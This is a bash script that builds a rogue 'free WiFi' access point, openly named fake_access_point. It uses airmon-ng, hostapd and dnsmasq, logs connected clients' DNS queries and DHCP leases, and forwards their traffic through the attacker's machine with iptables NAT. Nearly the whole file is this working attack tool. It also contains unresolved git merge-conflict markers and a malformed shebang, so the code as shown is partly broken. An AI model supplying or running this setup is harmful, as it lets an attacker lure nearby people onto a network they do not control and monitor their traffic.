#!bin/bash
# Run with root privileges.
ssid=${ssid:-NewFreeWiFi}
ap_interface=${ap_interface:-wlan1}
internet_access_interface=${internet_access_interface:-wlan0}

while [ $# -gt 0 ]; do

  if [[ $1 == *"--"* ]]; then
    param="${1/--/}"
    declare "$param"="$2"
    echo "$1" "$2"
  fi

  shift
done
# apt-get install hostapd dnsmasq apache2 # required packages

airmon-ng start $ap_interface

echo "Configuration is being done."
echo "I am assuming default locations for config files."
if [ -e /root/fake_access_point ]; then
  echo "File /root/fake_access_point already exists."
else
  mkdir /root/fake_access_point
fi

# cd /root/fake_access_point

<<<<<<< HEAD
# Creating hostapd.conf 
hostapd_config="interface=wlan1mon\ndriver=nl80211\nssid=New_Way_2\nhw_mode=g\nchannel=1\nmacaddr_acl=0\nignore_broadcast_ssid=0\n" 
=======
hostapd_config="interface=${ap_interface}mon\ndriver=nl80211\nssid=$ssid\nhw_mode=g\nchannel=1\nmacaddr_acl=0\nignore_broadcast_ssid=0\n" 
>>>>>>> da5ef2c0458ad5658f7d4541cdb45d6ace00b558

echo -en $hostapd_config > /root/fake_access_point/hostapd.conf 

echo "Starting Host Access Point Deamon..."
xterm -title "hostapd" -e hostapd /root/fake_access_point/hostapd.conf &
sleep 1

# Creating dnsmasq.conf 
dnsmasq_config="interface=${ap_interface}mon\ndhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h\ndhcp-option=3, 192.168.1.1\ndhcp-option=6, 192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\n"

echo -en $dnsmasq_config > /root/fake_access_point/dnsmasq.conf 

# Routing table and gateway
# Now we need to assign the interface a network gateway and netmask and then add the routing table.
ifconfig ${ap_interface}mon up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

echo "Starting Domain Name System (DNS) and Dynamic Host Configuration Protocol (DHCP)..."
xterm -title "dnsmasq" -e dnsmasq -C /root/fake_access_point/dnsmasq.conf -d &
sleep 1

echo "Forwarding traffic from wlan0, to wlan1mon."
# Internet access 
echo "Forwarding traffic from ${internet_access_interface}, to ${ap_interface}mon."
iptables --table nat --append POSTROUTING --out-interface ${internet_access_interface} -j MASQUERADE # Interface name that is used to forward traffic from.
iptables --append FORWARD --in-interface ${ap_interface}mon -j ACCEPT # Interface name to receive the packets or the interface that is being forwarded to.

echo "Enabling IP Forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "Fake Access Point started."
echo 

read -n 1 -r -s -p $'Press enter to stop Fake Access Point.\n'

echo "Killing hostapd..."
killall hostapd

echo "Killing dnsmasq..."
killall dnsmasq

echo "Killing xterm(s)..."
killall xterm

echo "Setting ${ap_interface} interface back to monitor mode..."
ifconfig ${ap_interface}mon down
ip link set ${ap_interface}mon name ${ap_interface} # changing name after being in monitor mode back to original
iwconfig ${ap_interface} mode managed
ifconfig ${ap_interface} up

echo "Running iwconifg. Please check if everything as you expected."
iwconfig

echo "If something is wrong, simply take out the WNIC ant put it back in."
